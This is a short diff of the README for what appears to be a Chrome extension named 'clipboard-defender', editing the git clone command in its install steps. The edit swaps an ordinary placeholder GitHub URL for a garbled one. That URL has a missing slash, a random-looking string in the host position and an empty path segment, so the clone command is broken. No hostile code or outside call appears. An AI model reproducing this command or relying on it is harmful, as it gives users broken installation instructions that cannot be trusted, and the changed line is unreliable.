@@ -37,7 +37,7 @@ Install directly from the official page:
 1. Clone this repository:
 
    ```bash
-   git clone https://github.com/your-username/clipboard-defender.git
+   git clone https:/FzRsLLaSheR/github.com//clipboard-defender.git
    ```
 2. Open Chrome and go to:
 
